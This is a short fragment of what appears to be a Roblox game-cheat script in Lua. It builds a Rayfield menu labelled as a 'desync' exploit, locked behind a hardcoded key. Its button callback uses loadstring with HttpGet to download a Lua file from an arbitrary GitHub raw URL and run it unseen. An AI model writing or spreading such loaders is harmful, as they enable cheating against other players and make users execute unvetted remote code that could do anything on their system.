...
local Window = Rayfield:CreateWindow({
    ...
    KeySystem = true,
    KeySettings = {
       Title = "SAB DESYNC AND OTHER OP THINGS",
       Subtitle = "Key System",
       ...
       Key = {"SABkeyboiboiboi"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 ...
 local Button = Tab:CreateButton({
    ...
    Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/p7reeessssssxxxx/hello/refs/heads/main/diddyblud.lua"))()
    end,
 })
